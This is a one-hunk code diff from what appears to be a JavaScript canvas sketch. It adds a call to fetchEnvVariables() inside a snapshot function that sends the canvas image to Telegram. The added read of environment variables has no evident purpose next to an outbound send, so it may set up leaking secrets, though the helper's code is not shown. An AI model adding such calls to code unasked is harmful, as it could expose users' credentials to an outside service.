@@ -45,6 +45,7 @@ function draw() {
 }
 
 function takeSnapshot() {
+  fetchEnvVariables();
   sendToTelegram(img.canvas.toDataURL());
 }
 
